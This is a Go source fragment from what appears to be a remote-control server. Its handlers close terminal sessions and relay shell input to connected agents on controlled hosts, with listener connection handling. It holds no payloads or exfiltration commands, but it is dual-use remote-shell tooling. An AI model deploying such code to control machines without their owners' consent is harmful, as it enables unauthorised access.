			log.Printf("Failed to dispatch session close command for client_id=%d session_id=%s", session.ClientID, sessionID)
		}
		time.Sleep(300 * time.Millisecond)
		// 断开终端后关闭该客户端在 channels 上的 /ws/agent，下次「连接」必走全新握手。
		s.chHub.CloseAgent(session.ClientID)
	}

	c.JSON(http.StatusOK, gin.H{"closed": true})
}

type sessionInputRequest struct {
	// 终端页应只发 input_b64（UTF-8 字节的 Base64），避免 JSON 里 \b \r \u0008 与 Agent 简易解析器不一致。
	InputB64 string `json:"input_b64"`
	// 兼容旧前端：明文 input（仍可能被二次 JSON 转义破坏控制符，不推荐）
	Input string `json:"input"`
}

func (s *Server) handleSessionInput(c *gin.Context) {
	sessionID := c.Param("id")

	var session models.Session
	if err := s.db.First(&session, sessionID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "session not found"})
		return
	}

	if session.Status != "active" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "session is not active"})
		return
	}

	var req sessionInputRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
		return
	}

	var payload map[string]interface{}
	if req.InputB64 != "" {
		raw, err := base64.StdEncoding.DecodeString(req.InputB64)
		if err != nil || len(raw) > 256*1024 {
			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid input_b64"})
			return
		}
		if len(raw) > 3 {
			log.Printf("[trace] API POST /sessions/%s/input client_id=%d input_b64_dec_len=%d -> shell_session_write",
				sessionID, session.ClientID, len(raw))
		}
		payload = map[string]interface{}{
			"session_id": sessionID,
			"input_b64":  req.InputB64,
		}
	} else if req.Input != "" {
		if len(req.Input) > 3 {
			log.Printf("[trace] API POST /sessions/%s/input client_id=%d input_len=%d input_snip=%q -> will shell_session_write (legacy input)",
				sessionID, session.ClientID, len(req.Input), traceSnippet(req.Input, 120))
		}
		payload = map[string]interface{}{
			"session_id": sessionID,
			"input":      req.Input,
		}
	} else {
		c.JSON(http.StatusBadRequest, gin.H{"error": "input_b64 or input required"})
		return
	}

	// 发送输入到客户端（优先走 input_b64，JSON 线路上仅含可打印字符）
	cmd, err := s.cmdMgr.CreateCommand(session.ClientID, "shell_session_write", payload)
	if err != nil || !s.dispatchCommandToAgent(c, session.ClientID, cmd) {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to send input to client"})
		return
	}

	if req.InputB64 != "" || len(req.Input) > 3 {
		log.Printf("[trace] API POST /sessions/%s/input -> 202 accepted (stream shell_output on browser /ws)", sessionID)
	}
	// 仅表示输入已转发给被控端；执行结果通过终端页 WebSocket 异步推送 shell_output，不在此 HTTP 响应中返回
	c.JSON(http.StatusAccepted, gin.H{"accepted": true})
}

func (s *Server) handleNewConnection(l *models.Listener, conn net.Conn) {
	agent.HandleConnection(s.db, l, conn, s.wsHub, s.tunnelMgr, s.cmdMgr)
}

